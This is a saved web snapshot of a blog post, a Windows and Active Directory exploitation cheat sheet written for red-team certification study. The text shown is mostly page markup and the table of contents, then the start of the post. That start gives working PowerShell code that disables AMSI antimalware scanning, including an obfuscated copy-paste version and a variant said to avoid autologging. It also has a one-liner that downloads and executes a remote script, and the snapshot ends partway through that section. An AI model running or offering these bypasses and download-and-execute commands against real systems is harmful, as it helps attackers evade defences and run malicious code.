From: <Saved by Blink>
Snapshot-Content-Location: https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
Subject: Windows & Active Directory Exploitation Cheat Sheet and Command Reference :: Cas van Cooten
Date: Wed, 2 Aug 2023 13:42:47 -0000
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----"


------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/html
Content-ID: <frame-FA1A30C4513290A080D53E5DC5FC0D23@mhtml.blink>
Content-Transfer-Encoding: quoted-printable
Content-Location: https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/

<!DOCTYPE html><html lang=3D"en" data-theme=3D"dark"><head><meta http-equiv=
=3D"Content-Type" content=3D"text/html; charset=3DUTF-8"><link rel=3D"style=
sheet" type=3D"text/css" href=3D"cid:css-4723b45b-3ce4-4b1e-a2ff-e0c45ed479=
00@mhtml.blink" /><meta http-equiv=3D"x-ua-compatible" content=3D"ie=3Dedge=
"><meta name=3D"viewport" content=3D"width=3Ddevice-width,initial-scale=3D1=
,shrink-to-fit=3Dno"><meta name=3D"author" content=3D"map[name:Cas van Coot=
en]"><meta name=3D"description" content=3D"Last update: November 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some tech=
niques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rub=
eus, and Mimikatz sections. Fixed some whoopsies as well =F0=9F=99=83.
Updated June 5th, 2021: I have made some more changes to this post based on=
 (among others) techniques discussed in ZeroPointSecurity&amp;rsquo;s &amp;=
lsquo;Red Team Ops&amp;rsquo; course (for the CRTO certification). I&amp;rs=
quo;ve re-written and improved many sections. New sections have been added =
on DPAPI and GPO abuse."><meta name=3D"keywords" content=3D"homepage,blog,c=
as van cooten,security,hacking,Active Directory,Windows,Hacking"><meta name=
=3D"robots" content=3D"noodp"><meta name=3D"theme-color" content=3D""><link=
 rel=3D"canonical" href=3D"https://casvancooten.com/posts/2020/11/windows-a=
ctive-directory-exploitation-cheat-sheet-and-command-reference/"><title>Win=
dows &amp; Active Directory Exploitation Cheat Sheet and Command Reference =
:: Cas van Cooten</title><link rel=3D"stylesheet" href=3D"https://cdnjs.clo=
udflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" crossorigi=
n=3D"anonymous" referrerpolicy=3D"no-referrer"><link rel=3D"stylesheet" hre=
f=3D"https://casvancooten.com/main.2a064c455b0ecbd6b1481b3bf9df2441e9583869=
1022f40a5338c2cb1244f075.css"><link rel=3D"apple-touch-icon" sizes=3D"180x1=
80" href=3D"https://casvancooten.com/apple-touch-icon.png"><link rel=3D"ico=
n" type=3D"image/png" sizes=3D"32x32" href=3D"https://casvancooten.com/favi=
con-32x32.png"><link rel=3D"icon" type=3D"image/png" sizes=3D"16x16" href=
=3D"https://casvancooten.com/favicon-16x16.png"><link rel=3D"manifest" href=
=3D"https://casvancooten.com/site.webmanifest"><link rel=3D"mask-icon" href=
=3D"https://casvancooten.com/safari-pinned-tab.svg" color=3D""><link rel=3D=
"shortcut icon" href=3D"https://casvancooten.com/favicon.ico"><meta name=3D=
"msapplication-TileColor" content=3D""><meta itemprop=3D"name" content=3D"W=
indows &amp; Active Directory Exploitation Cheat Sheet and Command Referenc=
e"><meta itemprop=3D"description" content=3D"Last update: November 3rd, 202=
1
Updated November 3rd, 2021: Included several fixes and actualized some tech=
niques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rub=
eus, and Mimikatz sections. Fixed some whoopsies as well =F0=9F=99=83.
Updated June 5th, 2021: I have made some more changes to this post based on=
 (among others) techniques discussed in ZeroPointSecurity=E2=80=99s =E2=80=
=98Red Team Ops=E2=80=99 course (for the CRTO certification). I=E2=80=99ve =
re-written and improved many sections. New sections have been added on DPAP=
I and GPO abuse."><meta itemprop=3D"datePublished" content=3D"2020-11-04T00=
:00:00+00:00"><meta itemprop=3D"dateModified" content=3D"2023-02-13T09:25:4=
2+01:00"><meta itemprop=3D"wordCount" content=3D"6475"><meta itemprop=3D"im=
age" content=3D"https://casvancooten.com/preview.png"><meta itemprop=3D"key=
words" content=3D"Active Directory,Windows,Hacking,"><meta name=3D"twitter:=
card" content=3D"summary_large_image"><meta name=3D"twitter:image" content=
=3D"https://casvancooten.com/preview.png"><meta name=3D"twitter:title" cont=
ent=3D"Windows &amp; Active Directory Exploitation Cheat Sheet and Command =
Reference"><meta name=3D"twitter:description" content=3D"Last update: Novem=
ber 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some tech=
niques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rub=
eus, and Mimikatz sections. Fixed some whoopsies as well =F0=9F=99=83.
Updated June 5th, 2021: I have made some more changes to this post based on=
 (among others) techniques discussed in ZeroPointSecurity=E2=80=99s =E2=80=
=98Red Team Ops=E2=80=99 course (for the CRTO certification). I=E2=80=99ve =
re-written and improved many sections. New sections have been added on DPAP=
I and GPO abuse."><meta property=3D"og:title" content=3D"Windows &amp; Acti=
ve Directory Exploitation Cheat Sheet and Command Reference"><meta property=
=3D"og:description" content=3D"Last update: November 3rd, 2021
Updated November 3rd, 2021: Included several fixes and actualized some tech=
niques. Changes made to the Defender evasion, RBCD, Domain Enumeration, Rub=
eus, and Mimikatz sections. Fixed some whoopsies as well =F0=9F=99=83.
Updated June 5th, 2021: I have made some more changes to this post based on=
 (among others) techniques discussed in ZeroPointSecurity=E2=80=99s =E2=80=
=98Red Team Ops=E2=80=99 course (for the CRTO certification). I=E2=80=99ve =
re-written and improved many sections. New sections have been added on DPAP=
I and GPO abuse."><meta property=3D"og:type" content=3D"article"><meta prop=
erty=3D"og:url" content=3D"https://casvancooten.com/posts/2020/11/windows-a=
ctive-directory-exploitation-cheat-sheet-and-command-reference/"><meta prop=
erty=3D"og:image" content=3D"https://casvancooten.com/preview.png"><meta pr=
operty=3D"article:section" content=3D"posts"><meta property=3D"article:publ=
ished_time" content=3D"2020-11-04T00:00:00+00:00"><meta property=3D"article=
:modified_time" content=3D"2023-02-13T09:25:42+01:00"><meta property=3D"og:=
see_also" content=3D"https://casvancooten.com/posts/2020/05/oscp-cheat-shee=
t-and-command-reference/"><meta property=3D"article:published_time" content=
=3D"2020-11-04 00:00:00 +0000 UTC"><link rel=3D"stylesheet" type=3D"text/cs=
s" href=3D"chrome-extension://bbpokcagpggnekcmamgdieebhpkjmljm/css/fonts.cs=
s"></head><body data-new-gr-c-s-check-loaded=3D"14.1117.0" data-gr-ext-inst=
alled=3D""><div class=3D"container"><header class=3D"header"><span class=3D=
"header__inner"><a href=3D"https://casvancooten.com/" style=3D"text-decorat=
ion:none"><div class=3D"logo"><span class=3D"logo__mark">&gt;</span>
<span class=3D"logo__text">Security Ramblings</span>
<span class=3D"logo__cursor"></span></div></a><span class=3D"header__right"=
><nav class=3D"menu"><ul class=3D"menu__inner"><li><a href=3D"https://casva=
ncooten.com/about/">About</a></li><li><a href=3D"https://casvancooten.com/p=
osts/">Blog</a></li></ul></nav><span class=3D"menu-trigger hidden"><svg xml=
ns=3D"http://www.w3.org/2000/svg" viewBox=3D"0 0 24 24"><path d=3D"M0 0h24v=
24H0z" fill=3D"none"></path><path d=3D"M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v=
2h18V6H3z"></path></svg></span><span class=3D"theme-toggle not-selectable">=
<svg class=3D"theme-toggler" width=3D"24" height=3D"24" viewBox=3D"0 0 48 4=
8" fill=3D"none" xmlns=3D"http://www.w3.org/2000/svg"><path d=3D"M22 41c10.=
4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8=
.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z=
"></path></svg></span></span></span></header><div class=3D"content"><main c=
lass=3D"post"><div class=3D"post-info"><p><svg xmlns=3D"http://www.w3.org/2=
000/svg" width=3D"24" height=3D"24" viewBox=3D"0 0 24 24" fill=3D"none" str=
oke=3D"currentcolor" stroke-width=3D"2" stroke-linecap=3D"round" stroke-lin=
ejoin=3D"round" class=3D"feather feather-clock"><circle cx=3D"12" cy=3D"12"=
 r=3D"10"></circle><polyline points=3D"12 6 12 12 16 14"></polyline></svg>3=
1 minutes</p></div><article><h1 class=3D"post-title"><a href=3D"https://cas=
vancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-she=
et-and-command-reference/">Windows &amp; Active Directory Exploitation Chea=
t Sheet and Command Reference</a></h1><hr><aside id=3D"toc"><div class=3D"t=
oc-title">Table of Contents</div><nav id=3D"TableOfContents"><ul><li><a hre=
f=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-exploi=
tation-cheat-sheet-and-command-reference/#general">General</a><ul><li><a hr=
ef=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-explo=
itation-cheat-sheet-and-command-reference/#powershell-amsi-bypass">PowerShe=
ll AMSI Bypass</a></li><li><a href=3D"https://casvancooten.com/posts/2020/1=
1/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#=
powershell-one-liners">PowerShell one-liners</a></li></ul></li><li><a href=
=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-exploit=
ation-cheat-sheet-and-command-reference/#enumeration">Enumeration</a><ul><l=
i><a href=3D"https://casvancooten.com/posts/2020/11/windows-active-director=
y-exploitation-cheat-sheet-and-command-reference/#ad-enumeration-with-power=
view">AD Enumeration With PowerView</a></li><li><a href=3D"https://casvanco=
oten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-an=
d-command-reference/#applocker">AppLocker</a></li><li><a href=3D"https://ca=
svancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sh=
eet-and-command-reference/#powershell-constrained-language-mode">PowerShell=
 Constrained Language Mode</a></li><li><a href=3D"https://casvancooten.com/=
posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command=
-reference/#laps">LAPS</a></li></ul></li><li><a href=3D"https://casvancoote=
n.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-c=
ommand-reference/#lateral-movement">Lateral Movement</a><ul><li><a href=3D"=
https://casvancooten.com/posts/2020/11/windows-active-directory-exploitatio=
n-cheat-sheet-and-command-reference/#lateral-movement-enumeration-with-powe=
rview">Lateral Movement Enumeration With PowerView</a></li><li><a href=3D"h=
ttps://casvancooten.com/posts/2020/11/windows-active-directory-exploitation=
-cheat-sheet-and-command-reference/#bloodhound">BloodHound</a></li><li><a h=
ref=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-expl=
oitation-cheat-sheet-and-command-reference/#kerberoasting">Kerberoasting</a=
></li><li><a href=3D"https://casvancooten.com/posts/2020/11/windows-active-=
directory-exploitation-cheat-sheet-and-command-reference/#as-rep-roasting">=
AS-REP roasting</a></li><li><a href=3D"https://casvancooten.com/posts/2020/=
11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/=
#token-manipulation">Token Manipulation</a></li><li><a href=3D"https://casv=
ancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-shee=
t-and-command-reference/#lateral-movement-with-rubeus">Lateral Movement wit=
h Rubeus</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/wind=
ows-active-directory-exploitation-cheat-sheet-and-command-reference/#latera=
l-movement-with-mimikatz">Lateral Movement with Mimikatz</a></li><li><a hre=
f=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-exploi=
tation-cheat-sheet-and-command-reference/#command-execution-with-scheduled-=
tasks">Command execution with scheduled tasks</a></li><li><a href=3D"https:=
//casvancooten.com/posts/2020/11/windows-active-directory-exploitation-chea=
t-sheet-and-command-reference/#command-execution-with-wmi">Command executio=
n with WMI</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/wi=
ndows-active-directory-exploitation-cheat-sheet-and-command-reference/#comm=
and-execution-with-powershell-remoting">Command execution with PowerShell R=
emoting</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/windo=
ws-active-directory-exploitation-cheat-sheet-and-command-reference/#unconst=
rained-delegation">Unconstrained delegation</a></li><li><a href=3D"https://=
casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-=
sheet-and-command-reference/#constrained-delegation">Constrained delegation=
</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/windows-acti=
ve-directory-exploitation-cheat-sheet-and-command-reference/#resource-based=
-constrained-delegation">Resource-based constrained delegation</a></li><li>=
<a href=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-=
exploitation-cheat-sheet-and-command-reference/#abusing-domain-trust">Abusi=
ng domain trust</a></li><li><a href=3D"https://casvancooten.com/posts/2020/=
11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/=
#abusing-inter-forest-trust">Abusing inter-forest trust</a></li><li><a href=
=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-exploit=
ation-cheat-sheet-and-command-reference/#abusing-mssql-databases-for-latera=
l-movement">Abusing MSSQL databases for lateral movement</a></li><li><a hre=
f=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-exploi=
tation-cheat-sheet-and-command-reference/#abusing-group-policy-objects-for-=
lateral-movement">Abusing Group Policy Objects for lateral movement</a></li=
></ul></li><li><a href=3D"https://casvancooten.com/posts/2020/11/windows-ac=
tive-directory-exploitation-cheat-sheet-and-command-reference/#privilege-es=
calation">Privilege Escalation</a><ul><li><a href=3D"https://casvancooten.c=
om/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-comm=
and-reference/#powerup">PowerUp</a></li><li><a href=3D"https://casvancooten=
.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-co=
mmand-reference/#uac-bypass">UAC Bypass</a></li></ul></li><li><a href=3D"ht=
tps://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-=
cheat-sheet-and-command-reference/#persistence">Persistence</a><ul><li><a h=
ref=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-expl=
oitation-cheat-sheet-and-command-reference/#startup-folder">Startup folder<=
/a></li></ul></li><li><a href=3D"https://casvancooten.com/posts/2020/11/win=
dows-active-directory-exploitation-cheat-sheet-and-command-reference/#domai=
n-persistence">Domain Persistence</a><ul><li><a href=3D"https://casvancoote=
n.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-c=
ommand-reference/#mimikatz-skeleton-key-attack">Mimikatz skeleton key attac=
k</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/windows-act=
ive-directory-exploitation-cheat-sheet-and-command-reference/#grant-specifi=
c-user-dcsync-rights-with-powerview">Grant specific user DCSync rights with=
 PowerView</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/wi=
ndows-active-directory-exploitation-cheat-sheet-and-command-reference/#doma=
in-controller-dsrm-admin">Domain Controller DSRM admin</a></li><li><a href=
=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-exploit=
ation-cheat-sheet-and-command-reference/#modifying-security-descriptors-for=
-remote-wmi-access">Modifying security descriptors for remote WMI access</a=
></li><li><a href=3D"https://casvancooten.com/posts/2020/11/windows-active-=
directory-exploitation-cheat-sheet-and-command-reference/#modifying-securit=
y-descriptors-for-powershell-remoting-access">Modifying security descriptor=
s for PowerShell Remoting access</a></li><li><a href=3D"https://casvancoote=
n.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-c=
ommand-reference/#modifying-dc-registry-security-descriptors-for-remote-has=
h-retrieval-using-damp">Modifying DC registry security descriptors for remo=
te hash retrieval using DAMP</a></li><li><a href=3D"https://casvancooten.co=
m/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-comma=
nd-reference/#dcshadow">DCShadow</a></li></ul></li><li><a href=3D"https://c=
asvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-s=
heet-and-command-reference/#post-exploitation">Post-Exploitation</a><ul><li=
><a href=3D"https://casvancooten.com/posts/2020/11/windows-active-directory=
-exploitation-cheat-sheet-and-command-reference/#lsass-protection">LSASS pr=
otection</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/wind=
ows-active-directory-exploitation-cheat-sheet-and-command-reference/#dumpin=
g-os-credentials-with-mimikatz">Dumping OS credentials with Mimikatz</a></l=
i><li><a href=3D"https://casvancooten.com/posts/2020/11/windows-active-dire=
ctory-exploitation-cheat-sheet-and-command-reference/#abusing-the-data-prot=
ection-api-dpapi-with-mimikatz">Abusing the Data Protection API (DPAPI) wit=
h Mimikatz</a></li><li><a href=3D"https://casvancooten.com/posts/2020/11/wi=
ndows-active-directory-exploitation-cheat-sheet-and-command-reference/#dump=
ing-secrets-without-mimikatz">Dumping secrets without Mimikatz</a></li><li>=
<a href=3D"https://casvancooten.com/posts/2020/11/windows-active-directory-=
exploitation-cheat-sheet-and-command-reference/#windows-defender-evasion">W=
indows Defender evasion</a></li><li><a href=3D"https://casvancooten.com/pos=
ts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-re=
ference/#chisel-proxying">Chisel proxying</a></li><li><a href=3D"https://ca=
svancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sh=
eet-and-command-reference/#juicy-files">Juicy files</a></li></ul></li></ul>=
</nav></aside><hr><div class=3D"post-content"><p><em>Last update: <strong>N=
ovember 3rd, 2021</strong></em></p><p><em>Updated <strong>November 3rd, 202=
1</strong>: Included several fixes and actualized some techniques. Changes =
made to the Defender evasion, RBCD, Domain Enumeration, Rubeus, and Mimikat=
z sections. Fixed some whoopsies as well</em> =F0=9F=99=83.</p><p><em>Updat=
ed <strong>June 5th, 2021</strong>: I have made some more changes to this p=
ost based on (among others) techniques discussed in ZeroPointSecurity=E2=80=
=99s =E2=80=98Red Team Ops=E2=80=99 course (for the CRTO certification). I=
=E2=80=99ve re-written and improved many sections. New sections have been a=
dded on DPAPI and GPO abuse. Notable changes have been made to the the sect=
ions on LAPS, AppLocker &amp; CLM, PowerView, and Overpass-the-Hash with Ru=
beus. Enjoy! :)</em></p><p><em>Updated <strong>March 26th, 2021</strong>: T=
his blog post has been updated based on some tools and techniques from Offe=
nsive Security=E2=80=99s PEN-300 course (for the accompanying OSEP certific=
ation). Notable changes have been made in the sections on delegation, inter=
-forest exploitation, and lateral movement through MSSQL servers. Some othe=
r changes and clarifications have been made throughout the post.</em></p><p=
>Since I recently completed my CRTP and CRTE exams, I decided to compile a =
list of my most-used techniques and commands for Microsoft Windows and Acti=
ve Directory (post-)exploitation. It is largely aimed at completing these t=
wo certifications, but should be useful in a lot of cases when dealing with=
 Windows / AD exploitation.</p><p>That being said - it is <em>far from</em>=
 an exhaustive list. If you feel any important tips, tricks, commands or te=
chniques are missing from this list just get in touch. I will try to keep i=
t updated as much as possible!</p><p>Many items of this list are shamelessl=
y stolen from certification courses (that come highly recommended) that dis=
cuss Active Directory, such as <a href=3D"https://www.alteredsecurity.com/a=
dlab">CRTP</a>, <a href=3D"https://www.alteredsecurity.com/redteamlab">CRTE=
</a>, <a href=3D"https://www.offensive-security.com/pen300-osep/">OSEP</a>,=
 and <a href=3D"https://www.zeropointsecurity.co.uk/red-team-ops">CRTO</a>.
If you are looking for the cheat sheet and command reference I used for OSC=
P, please refer to <a href=3D"https://cas.vancooten.com/posts/2020/05/oscp-=
cheat-sheet-and-command-reference/">this post</a>.</p><p><em>Note: I tried =
to highlight some poor OpSec choices for typical red teaming engagements wi=
th =F0=9F=9A=A9. I will likely have missed some though, so make sure you <s=
trong>understand what you are running</strong> before you run it!</em></p><=
h2 id=3D"general">General</h2><h3 id=3D"powershell-amsi-bypass">PowerShell =
AMSI Bypass</h3><p>Patching the Anti-Malware Scan Interface (AMSI) will hel=
p bypass AV warnings triggered when executing PowerShell scripts (or other =
AMSI-enabled content, such as JScript) that are marked as malicious. Do not=
 use as-is in covert operations, as they will get flagged =F0=9F=9A=A9. Obf=
uscate, or even better, eliminate the need for an AMSI bypass altogether by=
 altering your scripts to beat signature-based detection.</p><p>=E2=80=98Pl=
ain=E2=80=99 AMSI bypass example:</p><div class=3D"highlight"><div class=3D=
"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:=
#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powers=
hell"><code class=3D" language-powershell" data-lang=3D"powershell"><span c=
lass=3D"token namespace">[Ref]</span><span class=3D"token punctuation">.</s=
pan>Assembly<span class=3D"token punctuation">.</span>GetType<span class=3D=
"token punctuation">(</span><span class=3D"token string">'System.Management=
.Automation.AmsiUtils'</span><span class=3D"token punctuation">)</span><spa=
n class=3D"token punctuation">.</span>GetField<span class=3D"token punctuat=
ion">(</span><span class=3D"token string">'amsiInitFailed'</span><span clas=
s=3D"token punctuation">,</span><span class=3D"token string">'NonPublic,Sta=
tic'</span><span class=3D"token punctuation">)</span><span class=3D"token p=
unctuation">.</span>SetValue<span class=3D"token punctuation">(</span><span=
 class=3D"token variable">$null</span><span class=3D"token punctuation">,</=
span><span class=3D"token boolean">$true</span><span class=3D"token punctua=
tion">)</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Obfuscation example for copy-paste p=
urposes:</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabin=
dex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-=
o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" lan=
guage-powershell" data-lang=3D"powershell"><span class=3D"token function">s=
ET-ItEM</span> <span class=3D"token punctuation">(</span> <span class=3D"to=
ken string">'V'</span><span class=3D"token operator">+</span><span class=3D=
"token string">'aR'</span> <span class=3D"token operator">+</span>  <span c=
lass=3D"token string">'IA'</span> <span class=3D"token operator">+</span> <=
span class=3D"token string">'blE:1q2'</span>  <span class=3D"token operator=
">+</span> <span class=3D"token string">'uZx'</span>  <span class=3D"token =
punctuation">)</span> <span class=3D"token punctuation">(</span> <span clas=
s=3D"token namespace">[TYpE]</span><span class=3D"token punctuation">(</spa=
n>  <span class=3D"token string">"{1}{0}"</span><span class=3D"token operat=
or">-</span>F<span class=3D"token string">'F'</span><span class=3D"token pu=
nctuation">,</span><span class=3D"token string">'rE'</span>  <span class=3D=
"token punctuation">)</span> <span class=3D"token punctuation">)</span>  <s=
pan class=3D"token punctuation">;</span>    <span class=3D"token punctuatio=
n">(</span>    <span class=3D"token function">GeT-VariaBle</span>  <span cl=
ass=3D"token punctuation">(</span> <span class=3D"token string">"1Q2U"</spa=
n>  <span class=3D"token operator">+</span><span class=3D"token string">"zX=
"</span>  <span class=3D"token punctuation">)</span>  <span class=3D"token =
operator">-</span>VaL <span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">.</span><span class=3D"token string">"A`ss`Embly"</s=
pan><span class=3D"token punctuation">.</span><span class=3D"token string">=
"GET`TY`Pe"</span><span class=3D"token punctuation">(</span><span class=3D"=
token punctuation">(</span>  <span class=3D"token string">"{6}{3}{1}{4}{2}{=
0}{5}"</span> <span class=3D"token operator">-</span>f<span class=3D"token =
string">'Util'</span><span class=3D"token punctuation">,</span><span class=
=3D"token string">'A'</span><span class=3D"token punctuation">,</span><span=
 class=3D"token string">'Amsi'</span><span class=3D"token punctuation">,</s=
pan><span class=3D"token string">'.Management.'</span><span class=3D"token =
punctuation">,</span><span class=3D"token string">'utomation.'</span><span =
class=3D"token punctuation">,</span><span class=3D"token string">'s'</span>=
<span class=3D"token punctuation">,</span><span class=3D"token string">'Sys=
tem'</span>  <span class=3D"token punctuation">)</span> <span class=3D"toke=
n punctuation">)</span><span class=3D"token punctuation">.</span><span clas=
s=3D"token string">"g`etf`iElD"</span><span class=3D"token punctuation">(</=
span>  <span class=3D"token punctuation">(</span> <span class=3D"token stri=
ng">"{0}{2}{1}"</span> <span class=3D"token operator">-</span>f<span class=
=3D"token string">'amsi'</span><span class=3D"token punctuation">,</span><s=
pan class=3D"token string">'d'</span><span class=3D"token punctuation">,</s=
pan><span class=3D"token string">'InitFaile'</span>  <span class=3D"token p=
unctuation">)</span><span class=3D"token punctuation">,</span><span class=
=3D"token punctuation">(</span>  <span class=3D"token string">"{2}{4}{0}{1}=
{3}"</span> <span class=3D"token operator">-</span>f <span class=3D"token s=
tring">'Stat'</span><span class=3D"token punctuation">,</span><span class=
=3D"token string">'i'</span><span class=3D"token punctuation">,</span><span=
 class=3D"token string">'NonPubli'</span><span class=3D"token punctuation">=
,</span><span class=3D"token string">'c'</span><span class=3D"token punctua=
tion">,</span><span class=3D"token string">'c,'</span> <span class=3D"token=
 punctuation">)</span><span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">.</span><span class=3D"token string">"sE`T`VaLUE"</s=
pan><span class=3D"token punctuation">(</span>  $<span class=3D"token punct=
uation">{</span>n`ULl<span class=3D"token punctuation">}</span><span class=
=3D"token punctuation">,</span>$<span class=3D"token punctuation">{</span>t=
`RuE<span class=3D"token punctuation">}</span> <span class=3D"token punctua=
tion">)</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Another bypass, which is not detecte=
d by PowerShell autologging:</p><div class=3D"highlight"><div class=3D"code=
-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#2020=
20;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"=
><code class=3D" language-powershell" data-lang=3D"powershell"><span class=
=3D"token namespace">[Delegate]</span>::CreateDelegate<span class=3D"token =
punctuation">(</span><span class=3D"token punctuation">(</span><span class=
=3D"token string">"Func``3[String, <span class=3D"token function">$<span cl=
ass=3D"token punctuation">(</span><span class=3D"token punctuation">(</span=
><span class=3D"token namespace">[String]</span><span class=3D"token punctu=
ation">.</span>Assembly<span class=3D"token punctuation">.</span>GetType<sp=
an class=3D"token punctuation">(</span><span class=3D"token string">'System=
.Reflection.Bindin'</span><span class=3D"token operator">+</span><span clas=
s=3D"token string">'gFlags'</span><span class=3D"token punctuation">)</span=
></span>).FullName), System.Reflection.FieldInfo]"</span> <span class=3D"to=
ken operator">-as</span> <span class=3D"token namespace">[String]</span><sp=
an class=3D"token punctuation">.</span>Assembly<span class=3D"token punctua=
tion">.</span>GetType<span class=3D"token punctuation">(</span><span class=
=3D"token string">'System.T'</span><span class=3D"token operator">+</span><=
span class=3D"token string">'ype'</span><span class=3D"token punctuation">)=
</span><span class=3D"token punctuation">)</span><span class=3D"token punct=
uation">,</span> <span class=3D"token namespace">[Object]</span><span class=
=3D"token punctuation">(</span><span class=3D"token namespace">[Ref]</span>=
<span class=3D"token punctuation">.</span>Assembly<span class=3D"token punc=
tuation">.</span>GetType<span class=3D"token punctuation">(</span><span cla=
ss=3D"token string">'System.Management.Automation.AmsiUtils'</span><span cl=
ass=3D"token punctuation">)</span><span class=3D"token punctuation">)</span=
><span class=3D"token punctuation">,</span><span class=3D"token punctuation=
">(</span><span class=3D"token string">'GetFie'</span><span class=3D"token =
operator">+</span><span class=3D"token string">'ld'</span><span class=3D"to=
ken punctuation">)</span><span class=3D"token punctuation">)</span><span cl=
ass=3D"token punctuation">.</span>Invoke<span class=3D"token punctuation">(=
</span><span class=3D"token string">'amsiInitFailed'</span><span class=3D"t=
oken punctuation">,</span><span class=3D"token punctuation">(</span><span c=
lass=3D"token punctuation">(</span><span class=3D"token string">'Non'</span=
><span class=3D"token operator">+</span><span class=3D"token string">'Publi=
c,Static'</span><span class=3D"token punctuation">)</span> <span class=3D"t=
oken operator">-as</span> <span class=3D"token namespace">[String]</span><s=
pan class=3D"token punctuation">.</span>Assembly<span class=3D"token punctu=
ation">.</span>GetType<span class=3D"token punctuation">(</span><span class=
=3D"token string">'System.Reflection.Bindin'</span><span class=3D"token ope=
rator">+</span><span class=3D"token string">'gFlags'</span><span class=3D"t=
oken punctuation">)</span><span class=3D"token punctuation">)</span><span c=
lass=3D"token punctuation">)</span><span class=3D"token punctuation">.</spa=
n>SetValue<span class=3D"token punctuation">(</span><span class=3D"token va=
riable">$null</span><span class=3D"token punctuation">,</span><span class=
=3D"token boolean">$True</span><span class=3D"token punctuation">)</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><blockquote><p>More bypasses <a href=3D=
"https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">here</a>. For ob=
fuscation, check <a href=3D"https://github.com/danielbohannon/Invoke-Obfusc=
ation">Invoke-Obfuscation</a>, or get a custom-generated obfuscated version=
 at <a href=3D"https://amsi.fail/">amsi.fail</a>.</p></blockquote><h3 id=3D=
"powershell-one-liners">PowerShell one-liners</h3><h4 id=3D"load-powershell=
-script-reflectively">Load PowerShell script reflectively</h4><p>Proxy-awar=
e:</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D=
"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-=
size:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-=
powershell" data-lang=3D"powershell"><span class=3D"token function">IEX</sp=
an> <span class=3D"token punctuation">(</span><span class=3D"token function=
">New-Object</span> Net<span class=3D"token punctuation">.</span>WebClient<=
span class=3D"token punctuation">)</span><span class=3D"token punctuation">=
.</span>DownloadString<span class=3D"token punctuation">(</span><span class=
=3D"token string">'http://10.10.16.7/PowerView.obs.ps1'</span><span class=
=3D"token punctuation">)</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Non-proxy aware:</p><div class=3D"hi=
ghlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0=
d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" cla=
